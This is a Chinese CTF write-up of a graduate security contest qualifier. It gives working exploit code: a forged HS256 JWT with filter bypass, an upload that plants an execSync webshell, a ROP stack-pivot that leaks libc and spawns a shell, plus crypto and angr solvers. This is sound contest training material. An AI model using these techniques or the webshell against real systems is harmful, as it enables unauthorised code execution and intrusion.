# “华为杯”第一届中国研究生网络安全创新大赛初赛WriteUp

> 原文: https://www.ctfiot.com/75117.html
> ID: 75117

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

拿到这个web看了一眼去看misc了，后来想了想又回头来做了。

拿到手是一个node，看来一下app.js，里面存在这个。

var publicKey = fs.readFileSync('./config/public.pem');app.use(expressjwt({ secret: publicKey, algorithms: ["HS256","RS256"]}).unless({ path: ["/", "/api/login"] }))app.use(function(req, res, next) { if([req.body, req.query, req.auth,req.headers].some(function(item) { console.log(req.auth) return item &&/../|proc|public|routes|.js|cron|views/img.test(JSON.stringify(item));})) { return res.status(403).send('illegal data.');} else { next();};});

不难想到是HS256伪造jwt来绕过关键字 继续看到这个api.js，存在/upload路由，可以把文件写到一个特定的位置。这里就可 以构造一个jwt，使用url对象来绕过文件的限制，把pathname改成routes路径，即 index.js的目录。关键字核验使用url编码绕过就好。并且在start.sh中看到了nodemon，存在自动重启，思路就是这样。

#!/bin/bashsleep 1runuser -u ctfer nodemon app.js/usr/bin/tail -f /dev/null

var jwt = require("jsonwebtoken");var fs = require("fs");payload = { isAdmin: true, username: "admin", home: { "href": "ank1e", "origin": "ank1e", "protocol":"file:", "hostname": "","pathname": "/app/%72%6f%75%74%65%73/index.%6a%73" }}var publicKey = fs.readFileSync('./public.pem');var token = jwt.sign(payload, publicKey, { algorithm: "HS256" });console.log(token)

拿到jwt

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIiwiaG9tZSI6eyJocmVmIjoiYW5rMWUiLCJvcmlnaW4iOiJhbmsxZSIsInByb3RvY29sIjoiZmlsZToiLCJob3N0bmFtZSI6IiIsInBhdGhuYW1lIjoiL2FwcC8lNzIlNmYlNzUlNzQlNjUlNzMvaW5kZXguJTZhJTczIn0sImlhdCI6MTY2ODMxOTQyOX0.FlEloSS0gf3QdUzkZRUegU0c47whg8SUvitxkOnGySg

然后构造一个index.js，写入一个execSync

var express = require('express');
const execSync = require('child_process').execSync;var router = express.Router();/* GET home page. */router.get('/', function(req, res, next) { // res.render('index', { title: 'HackThisBox' }); var cmd = execSync(req.query.cmd); res.send(cmd.toString());});module.exports = router;

然后执行/api/upload路由，上传文件进行替换，重启之后就能命令执行了

import requestssess = requests.session()url = 'http://192.168.1.107:
18000/'hearder = { "authorization":"BearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIiwiaG9tZSI6eyJocmVmIjoiYW5rMWUiLCJvcmlnaW4iOiJhbmsxZSIsInByb3RvY29sIjoiZmlsZToiLCJob3N0bmFtZSI6IiIsInBhdGhuYW1lIjoiL2FwcC8lNzIlNmYlNzUlNzQlNjUlNzMvaW5kZXguJTZhJTczIn0sImlhdCI6MTY2ODMxOTQyOX0.FlEloSS0gf3QdUzkZRUegU0c47whg8SUvitxkOnGySg"}file = {"file":("./index.js",open("./index.js","rb").read())}res =sess.post("http://192.168.1.107:
18000/api/upload",files=file,headers=hearder)print(res.text)res = sess.get("http://192.168.1.107:
18000/",params={"cmd":'/readflag'})print(res.text)

02

Misc

1

2

42064652d3431356135323533646230387d0ec187c229c4d4a44

03

Crypto

四层挑战

from pwn import *from Crypto.Util.number import *context.log_level='debug'def solve1(a,b,num1,N):
return inverse(a,N)*(num1-b)%N
# 差分 num2-num1
def solve2(a,N,num1,num2):b = (num2 - num1*a)%Nreturn inverse(a,N)*(num1-b)%N
# 差分 num3-num2,num2-num1
def solve3(N,num1,num2,num3):a = inverse(num2-num1,N)*(num3-num2)%Nb = num2-a*num1return inverse(a,N)*(num1-b)%N
# 等差数列求N
def solve4(num_list):t=[]for i in range(len(num_list)-1):t.append(num_list[i+1]-num_list[i])x=t[1]*t[3]-t[2]**2y=t[2]*t[4]-t[3]**2z=t[0]*t[4]-t[1]*t[3]N=GCD(GCD(x,y),z)num1,num2,num3=num_list[0],num_list[1],num_list[2]a=inverse(num2-num1,N)*(num3-num2)%Nb=num2-a*num1return inverse(a,N)*(num1-b)%Nnum_list = []r = remote('192.168.1.105',19999)while True:r.recvuntil('This is the')challege = r.recvline()
# print("challenge1" in str(challege))if "challenge1" in str(challege):r.recvuntil('a=')a = r.recvline()r.recvuntil('b=')b = r.recvline()r.recvuntil('N=')N = r.recvline()r.recvuntil('num1=')num1 = r.recvline()seed = solve1(int(a),int(b),int(num1),int(N))elif 'challenge2' in str(challege):r.recvuntil('a=')a = r.recvline()r.recvuntil('N=')N = r.recvline()r.recvuntil('num1=')num1 = r.recvline()r.recvuntil('num2=')num2 = r.recvline()seed = solve2(int(a),int(N),int(num1),int(num2))elif 'challenge3' in str(challege):r.recvuntil('N=')N = r.recvline()r.recvuntil('num1=')num1 = r.recvline()r.recvuntil('num2=')num2 = r.recvline()r.recvuntil('num3=')num3 = r.recvline()seed = solve3(int(N),int(num1),int(num2),int(num3))elif 'challenge4' in str(challege):r.recvuntil('num1=')num1 = r.recvline()num_list.append(int(num1))r.recvuntil('num2=')num2 = r.recvline()num_list.append(int(num2))r.recvuntil('num3=')num3 = r.recvline()num_list.append(int(num3))r.recvuntil('num4=')num4 = r.recvline()num_list.append(int(num4))r.recvuntil('num5=')num5 = r.recvline()num_list.append(int(num5))r.recvuntil('num6=')num6 = r.recvline()num_list.append(int(num6))seed = solve4(num_list)r.sendlineafter("seed =",str(seed))
# print(seed)r.interactive()

04

Re

这个题拿到手，ida打开看了一下

感觉可以直接爆破，写一个angr爆破一下，但是因为本地没环境，所以只能上 docker。

docker pull angr/angrdocker run -it -v $(pwd):/ang angr/angrcd /angpython exp.py

exp

import angrp = angr.Project('./infantvm')a = p.factory.entry_state()sm = p.factory.simulation_manager(a)def good(a): return b"Good job" in a.posix.dumps(1)def bad(a): return b"Try again" in a.posix.dumps(1)sm.explore(find=good,avoid=bad)if sm.found: find_a = sm.found[0] flag = find_a.posix.dumps(0) print(flag)

05

Pwn

栈迁移到bss上泄露libc地址，然后直接one_gadgaet进行getshell

EXP

from pwn import *#p = process('./stack')p = remote('192.168.1.103', 19999)elf = ELF('./stack')libc = ELF('./libc.so.6')leave_ret = 0x0000000000400718pop_rdi = 0x00000000004007a3bss = 0x00000000006010A0puts_plt = elf.plt['puts']puts_got = elf.got['puts']main = 0x000000000040071Aret = 0x0000000000400509#gdb.attach(p, "b main")payload = p64(ret)*0x20 + p64(pop_rdi) + p64(puts_got) +p64(puts_plt) + p64(main)p.sendafter(b"input your name:n", payload)payload = b'a'*0x70 + p64(bss) + p64(leave_ret)p.sendafter(b"input your data:n", payload)leak = u64(p.recv(6).ljust(8, b'x00')) - libc.sym['puts']log.success(hex(leak))sys = leak + libc.sym['system']binsh = leak + 0x000000000018ce57ogg = leak + 0xf1247payload = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys)p.sendafter(b"input your name:n", payload)payload = b'a'*0x70 + p64(bss) + p64(ogg)p.sendafter(b"input your data:n", payload)p.interactive()

ls /;ls /;bindevflag.txtliblib32lib64stackusrbindevflag.txtliblib32lib64stackusr: not foundcat /flag.txt;cat /flag.txt;: notfoundc4f67a718f59d93151f38a2804bf5feec4f67a718f59d93151f38sh: 30:

flag

a2804bf5feec4f67a718f59d93151f38

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
var publicKey = fs.readFileSync('./config/public.pem');app.use(expressjwt({ secret: publicKey, algorithms: ["HS256","RS256"]}).unless({ path: ["/", "/api/login"] }))app.use(function(req, res, next) { if([req.body, req.query, req.auth,req.headers].some(function(item) { console.log(req.auth) return item &&/../|proc|public|routes|.js|cron|views/img.test(JSON.stringify(item));})) { return res.status(403).send('illegal data.');} else { next();};});
#!/bin/bashsleep 1runuser -u ctfer nodemon app.js/usr/bin/tail -f /dev/null
var jwt = require("jsonwebtoken");var fs = require("fs");payload = { isAdmin: true, username: "admin", home: { "href": "ank1e", "origin": "ank1e", "protocol":"file:", "hostname": "","pathname": "/app/%72%6f%75%74%65%73/index.%6a%73" }}var publicKey = fs.readFileSync('./public.pem');var token = jwt.sign(payload, publicKey, { algorithm: "HS256" });console.log(token)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIiwiaG9tZSI6eyJocmVmIjoiYW5rMWUiLCJvcmlnaW4iOiJhbmsxZSIsInByb3RvY29sIjoiZmlsZToiLCJob3N0bmFtZSI6IiIsInBhdGhuYW1lIjoiL2FwcC8lNzIlNmYlNzUlNzQlNjUlNzMvaW5kZXguJTZhJTczIn0sImlhdCI6MTY2ODMxOTQyOX0.FlEloSS0gf3QdUzkZRUegU0c47whg8SUvitxkOnGySg
var express = require('express');
const execSync = require('child_process').execSync;var router = express.Router();/* GET home page. */router.get('/', function(req, res, next) { // res.render('index', { title: 'HackThisBox' }); var cmd = execSync(req.query.cmd); res.send(cmd.toString());});module.exports = router;
import requestssess = requests.session()url = 'http://192.168.1.107:
18000/'hearder = { "authorization":"BearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIiwiaG9tZSI6eyJocmVmIjoiYW5rMWUiLCJvcmlnaW4iOiJhbmsxZSIsInByb3RvY29sIjoiZmlsZToiLCJob3N0bmFtZSI6IiIsInBhdGhuYW1lIjoiL2FwcC8lNzIlNmYlNzUlNzQlNjUlNzMvaW5kZXguJTZhJTczIn0sImlhdCI6MTY2ODMxOTQyOX0.FlEloSS0gf3QdUzkZRUegU0c47whg8SUvitxkOnGySg"}file = {"file":("./index.js",open("./index.js","rb").read())}res =sess.post("http://192.168.1.107:
18000/api/upload",files=file,headers=hearder)print(res.text)res = sess.get("http://192.168.1.107:
18000/",params={"cmd":'/readflag'})print(res.text)
42064652d3431356135323533646230387d0ec187c229c4d4a44
from pwn import *from Crypto.Util.number import *context.log_level='debug'def solve1(a,b,num1,N):
return inverse(a,N)*(num1-b)%N
# 差分 num2-num1
def solve2(a,N,num1,num2):b = (num2 - num1*a)%Nreturn inverse(a,N)*(num1-b)%N
# 差分 num3-num2,num2-num1
def solve3(N,num1,num2,num3):a = inverse(num2-num1,N)*(num3-num2)%Nb = num2-a*num1return inverse(a,N)*(num1-b)%N
# 等差数列求N
def solve4(num_list):t=[]for i in range(len(num_list)-1):t.append(num_list[i+1]-num_list[i])x=t[1]*t[3]-t[2]**2y=t[2]*t[4]-t[3]**2z=t[0]*t[4]-t[1]*t[3]N=GCD(GCD(x,y),z)num1,num2,num3=num_list[0],num_list[1],num_list[2]a=inverse(num2-num1,N)*(num3-num2)%Nb=num2-a*num1return inverse(a,N)*(num1-b)%Nnum_list = []r = remote('192.168.1.105',19999)while True:r.recvuntil('This is the')challege = r.recvline()
# print("challenge1" in str(challege))if "challenge1" in str(challege):r.recvuntil('a=')a = r.recvline()r.recvuntil('b=')b = r.recvline()r.recvuntil('N=')N = r.recvline()r.recvuntil('num1=')num1 = r.recvline()seed = solve1(int(a),int(b),int(num1),int(N))elif 'challenge2' in str(challege):r.recvuntil('a=')a = r.recvline()r.recvuntil('N=')N = r.recvline()r.recvuntil('num1=')num1 = r.recvline()r.recvuntil('num2=')num2 = r.recvline()seed = solve2(int(a),int(N),int(num1),int(num2))elif 'challenge3' in str(challege):r.recvuntil('N=')N = r.recvline()r.recvuntil('num1=')num1 = r.recvline()r.recvuntil('num2=')num2 = r.recvline()r.recvuntil('num3=')num3 = r.recvline()seed = solve3(int(N),int(num1),int(num2),int(num3))elif 'challenge4' in str(challege):r.recvuntil('num1=')num1 = r.recvline()num_list.append(int(num1))r.recvuntil('num2=')num2 = r.recvline()num_list.append(int(num2))r.recvuntil('num3=')num3 = r.recvline()num_list.append(int(num3))r.recvuntil('num4=')num4 = r.recvline()num_list.append(int(num4))r.recvuntil('num5=')num5 = r.recvline()num_list.append(int(num5))r.recvuntil('num6=')num6 = r.recvline()num_list.append(int(num6))seed = solve4(num_list)r.sendlineafter("seed =",str(seed))
# print(seed)r.interactive()
docker pull angr/angrdocker run -it -v $(pwd):/ang angr/angrcd /angpython exp.py
import angrp = angr.Project('./infantvm')a = p.factory.entry_state()sm = p.factory.simulation_manager(a)def good(a): return b"Good job" in a.posix.dumps(1)def bad(a): return b"Try again" in a.posix.dumps(1)sm.explore(find=good,avoid=bad)if sm.found: find_a = sm.found[0] flag = find_a.posix.dumps(0) print(flag)
from pwn import *#p = process('./stack')p = remote('192.168.1.103', 19999)elf = ELF('./stack')libc = ELF('./libc.so.6')leave_ret = 0x0000000000400718pop_rdi = 0x00000000004007a3bss = 0x00000000006010A0puts_plt = elf.plt['puts']puts_got = elf.got['puts']main = 0x000000000040071Aret = 0x0000000000400509#gdb.attach(p, "b main")payload = p64(ret)*0x20 + p64(pop_rdi) + p64(puts_got) +p64(puts_plt) + p64(main)p.sendafter(b"input your name:n", payload)payload = b'a'*0x70 + p64(bss) + p64(leave_ret)p.sendafter(b"input your data:n", payload)leak = u64(p.recv(6).ljust(8, b'x00')) - libc.sym['puts']log.success(hex(leak))sys = leak + libc.sym['system']binsh = leak + 0x000000000018ce57ogg = leak + 0xf1247payload = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys)p.sendafter(b"input your name:n", payload)payload = b'a'*0x70 + p64(bss) + p64(ogg)p.sendafter(b"input your data:n", payload)p.interactive()
ls /;ls /;bindevflag.txtliblib32lib64stackusrbindevflag.txtliblib32lib64stackusr: not foundcat /flag.txt;cat /flag.txt;: notfoundc4f67a718f59d93151f38a2804bf5feec4f67a718f59d93151f38sh: 30:
a2804bf5feec4f67a718f59d93151f38
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1668574699.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1668574700.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1668574700.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1668574701.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1668574701.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1668574701.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1668574702.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/10-1668574703.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1668574703.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1668574706.jpeg)